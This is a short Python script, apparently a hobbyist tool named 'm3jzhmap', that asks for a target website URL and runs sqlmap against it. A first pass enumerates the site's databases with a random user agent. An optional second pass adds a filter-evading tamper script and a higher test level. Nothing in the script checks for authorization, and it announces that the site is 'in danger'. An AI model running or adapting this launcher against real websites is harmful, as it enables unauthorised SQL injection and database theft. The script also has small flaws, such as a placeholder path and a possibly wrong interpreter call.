import subprocess
from time import sleep
import os
import shutil


RED = "\033[31m"
GREEN = "\033[32m"
ORANGE = "\033[33m"
BLUE = "\033[34m"

print("""
Copyright (c) m3jzhmap developer

My Social Media Accounts

instagram.com/alm3jzh

tiktok.com/@alm3jzh
""")

sleep(3)

def find_sqlmap():
    sqlmap_path = shutil.which("sqlmap")
    
    if sqlmap_path is not None:
        return sqlmap_path
    else:
        # Provide the full path to sqlmap.py here
        return "C:/Enter/Your/Path/sqlmap/sqlmap.py"  # Replace with the actual path

def site_url():
    target_site = input("""[+] Enter Your Target Site

    example

    https://alm3jzh.com/php?=example

    - > :  """)
    
    sleep(2)
    print("[!] The Site Is Under Reconnaissance And In Danger !!!")
    sleep(2)
    print("[!] The Site Is Well Done ........")
    
    sqlmap_executable = find_sqlmap()

    if sqlmap_executable:
        subprocess.call(['python', sqlmap_executable, '-u', target_site, '--random-agent', '--batch', '--dbs'])

        print("Do you want to Upgrade The Scan ? [Y/n] : ")
        user_input = input().strip().lower()  # Get user input and convert to lowercase

        if user_input == 'y':
            subprocess.call(['python', sqlmap_executable, '-u', target_site, '--random-agent', '--batch', '--dbs', '--tamper=space2comment', '--level=3'])
            # Add your installation logic here
        elif user_input == 'n':
            print("Hi, With You alm3jzh. Think You To Use This Tool My Instagram.com/alm3jzh")
            sleep(5)
            return  # Return from the function to exit it
        else:
            print("Invalid input. Please enter 'Y' or 'n.")
    else:
        print("sqlmap not found. Please provide the full path to sqlmap.py in the script.")

site_url()
